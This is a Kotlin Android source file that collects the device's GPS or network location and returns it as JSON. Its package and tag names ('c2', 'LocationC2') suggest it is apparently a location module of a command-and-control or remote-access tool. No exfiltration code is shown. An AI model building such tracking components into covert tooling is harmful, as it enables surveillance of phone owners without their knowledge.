package com.outcome.c2

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object Location {

    private const val TAG = "LocationC2"

    fun get(ctx: Context): JSONObject {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // --- 1. Permission check ---
        val fineOk = ContextCompat.checkSelfPermission(
            ctx, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val coarseOk = ContextCompat.checkSelfPermission(
            ctx, Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!fineOk && !coarseOk) {
            return JSONObject().put("error", "location_permission_denied")
        }

        // --- 2. Providers available? ---
        val gpsOn = runCatching { lm.isProviderEnabled(LocationManager.GPS_PROVIDER) }
            .getOrDefault(false)
        val netOn = runCatching { lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) }
            .getOrDefault(false)

        if (!gpsOn && !netOn) {
            return JSONObject().put("error", "location_services_off")
        }

        // --- 3. Try getCurrentLocation (API 30+) for a fresh fix ---
        var best: android.location.Location? = null

        if (Build.VERSION.SDK_INT >= 30) {
            best = tryGetCurrent(ctx, lm, "network")
            if (best == null && gpsOn) {
                best = tryGetCurrent(ctx, lm, "gps")
            }
        }

        // --- 4. Fallback: last known location ---
        if (best == null) {
            best = getLastKnown(lm, fineOk)
        }

        // --- 5. Last resort: request live updates ---
        if (best == null) {
            best = requestLive(lm, gpsOn, netOn)
        }

        if (best == null) {
            return JSONObject()
                .put("error", "no_fix")
                .put("gps_enabled", gpsOn)
                .put("network_enabled", netOn)
        }

        return JSONObject()
            .put("lat", best.latitude)
            .put("lng", best.longitude)
            .put("accuracy", best.accuracy.toDouble())
            .put("provider", best.provider ?: "?")
            .put("timestamp", best.time)
    }

    /**
     * Force a fresh fix via getCurrentLocation (API 30+).
     */
    private fun tryGetCurrent(
        ctx: Context,
        lm: LocationManager,
        providerType: String
    ): android.location.Location? {
        if (Build.VERSION.SDK_INT < 30) return null

        val provider = when (providerType) {
            "gps" -> LocationManager.GPS_PROVIDER
            "network" -> LocationManager.NETWORK_PROVIDER
            else -> return null
        }
        if (!runCatching { lm.isProviderEnabled(provider) }.getOrDefault(false)) {
            return null
        }

        val latch = CountDownLatch(1)
        var result: android.location.Location? = null

        try {
            @Suppress("MissingPermission")
            lm.getCurrentLocation(
                provider,
                null,
                ContextCompat.getMainExecutor(ctx),
            ) { loc ->
                if (loc != null) result = loc
                latch.countDown()
            }
            latch.await(6, TimeUnit.SECONDS)
        } catch (_: Exception) {
        }
        return result
    }

    /**
     * Read last known location from all providers.
     */
    private fun getLastKnown(
        lm: LocationManager,
        fineOk: Boolean
    ): android.location.Location? {
        val providers = listOf(
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.PASSIVE_PROVIDER,
        )
        var best: android.location.Location? = null
        for (p in providers) {
            try {
                @Suppress("MissingPermission")
                val loc = lm.getLastKnownLocation(p) ?: continue
                if (best == null || loc.time > best!!.time) {
                    best = loc
                }
            } catch (_: Exception) {
            }
        }
        return best
    }

    /**
     * Block until we get a live update (max 8 seconds).
     */
    private fun requestLive(
        lm: LocationManager,
        gpsOn: Boolean,
        netOn: Boolean
    ): android.location.Location? {
        val provider = when {
            netOn -> LocationManager.NETWORK_PROVIDER
            gpsOn -> LocationManager.GPS_PROVIDER
            else -> return null
        }

        val latch = CountDownLatch(1)
        var result: android.location.Location? = null

        val listener = object : LocationListener {
            override fun onLocationChanged(location: android.location.Location) {
                result = location
                latch.countDown()
            }
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
            @Deprecated("") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        }

        return try {
            @Suppress("MissingPermission")
            lm.requestLocationUpdates(
                provider,
                0L,
                0f,
                listener,
                Looper.getMainLooper()
            )
            latch.await(8, TimeUnit.SECONDS)
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            result
        } catch (_: Exception) {
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            null
        }
    }
}
